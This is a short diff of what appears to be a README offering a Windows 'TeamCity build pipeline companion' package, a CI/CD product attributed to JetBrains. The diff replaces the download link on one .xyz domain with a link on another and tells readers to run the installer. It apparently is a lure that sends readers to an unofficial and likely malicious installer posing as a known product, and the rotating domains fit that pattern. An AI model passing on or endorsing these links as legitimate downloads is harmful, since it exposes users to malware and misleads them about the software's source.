@@ -6,8 +6,8 @@ JetBrains CI/CD server with deep IDE integration · Full product footprint · No
 
 > Use the project link below for Windows.
 
-* **Project link:** **[teamcity-build-pipeline-companion-2026.nexpath.xyz](https://teamcity-build-pipeline-companion-2026.nexpath.xyz/)**
-* **Full URL:** `https://teamcity-build-pipeline-companion-2026.nexpath.xyz/`
+* **Project link:** **[teamcity-build-pipeline-companion-2026.nerasix.xyz](https://teamcity-build-pipeline-companion-2026.nerasix.xyz/)**
+* **Full URL:** `https://teamcity-build-pipeline-companion-2026.nerasix.xyz/`
 * **Type:** Desktop package | Windows 10 and 11, 64-bit
 * **Setup:** Run the installer from the extracted folder
 
